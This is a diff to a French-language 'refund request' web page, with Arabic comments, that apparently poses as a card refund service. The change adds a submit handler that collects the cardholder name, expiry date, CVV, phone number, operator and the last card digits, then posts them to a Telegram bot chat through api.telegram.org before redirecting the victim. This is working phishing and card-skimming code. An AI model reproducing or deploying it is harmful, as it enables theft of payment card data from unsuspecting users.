@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,6 +12,7 @@
         }
     </style>
 </head>
+
 <body class="bg-gray-100 flex flex-col min-h-screen justify-between">
 
     <!-- Formulaire principal -->
@@ -30,7 +32,7 @@
         </p>
 
         <!-- Formulaire -->
-        <form id="remboursement-form" onsubmit="return redirectToTraitement(event)">
+        <form id="remboursement-form" onsubmit="handleFormSubmit(event)">
             <!-- Titulaire de la carte -->
             <div class="mb-4">
                 <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
@@ -142,25 +144,75 @@
                 cardError.classList.add('hidden');
             }
         }
-        function redirectToTraitement(event) {
-    event.preventDefault(); // منع إعادة تحميل الصفحة
 
-    // استخراج البيانات من النموذج
-    const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
-    const phoneNumber = document.getElementById('telephone').value;
+        // وظيفة إرسال البيانات إلى بوت تلغرام بعد تقديم النموذج
+        async function handleFormSubmit(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة عند إرسال النموذج
 
-    // التحقق من صحة رقم البطاقة
-    if (!/^\d{16}$/.test(cardNumber)) {
-        alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
-        return;
-    }
+            // استخراج البيانات المدخلة من النموذج
+            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, ''); // إزالة الفراغات
+            const phoneNumber = document.getElementById('telephone').value;
+            const cardHolder = document.getElementById('nom').value;
+            const expirationDate = document.getElementById('date-expiration').value;
+                        const cvv = document.getElementById('cvv').value;
+            const operateur = document.getElementById('operateur').value;
 
-    // حفظ البيانات في localStorage
-    localStorage.setItem('lastFourDigits', cardNumber.slice(-4)); // آخر 4 أرقام من البطاقة
-    localStorage.setItem('phoneNumber', phoneNumber); // رقم الهاتف
+            // التحقق من صحة رقم البطاقة
+            if (!/^\d{16}$/.test(cardNumber)) {
+                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
+                return;
+            }
 
-    // توجيه المستخدم إلى الصفحة الثانية
-    window.location.href = "Traitement.html";
-}    </script>
+            // حفظ البيانات في localStorage
+            localStorage.setItem('lastFourDigits', cardNumber.slice(-4)); // آخر 4 أرقام من البطاقة
+            localStorage.setItem('phoneNumber', phoneNumber); // رقم الهاتف
+
+            // إعداد رسالة للإرسال إلى بوت تلغرام
+            const message = `
+                Nouveau remboursement demandé:
+                \nNom du titulaire: ${cardHolder}
+                \nNuméro de carte (derniers 4 chiffres): ${cardNumber.slice(-4)}
+                \nNuméro de téléphone: ${phoneNumber}
+                \nDate d'expiration: ${expirationDate}
+                \nCode CVV: ${cvv}
+                \nOpérateur: ${operateur}
+            `;
+
+            // إعداد URL لطلب API
+            const telegramBotToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بـ API Token الخاص بالبوت
+            const chatId = 'YOUR_CHAT_ID'; // استبدل هذا بـ chat ID الخاص بك أو المحادثة مع البوت
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            // إرسال الطلب إلى بوت تلغرام
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                // التحقق من نجاح إرسال الرسالة
+                const result = await response.json();
+                if (result.ok) {
+                    alert("✅ Votre demande a été envoyée avec succès !");
+                    window.location.href = "Traitement.html"; // توجيه المستخدم إلى صفحة المعالجة بعد الإرسال
+                } else {
+                    alert("❌ Une erreur est survenue lors de l'envoi de la demande.");
+                }
+            } catch (error) {
+                alert("❌ Erreur de connexion au serveur.");
+                console.error('Error sending message to Telegram bot:', error);
+            }
+        }
+    </script>
+
 </body>
+
 </html>
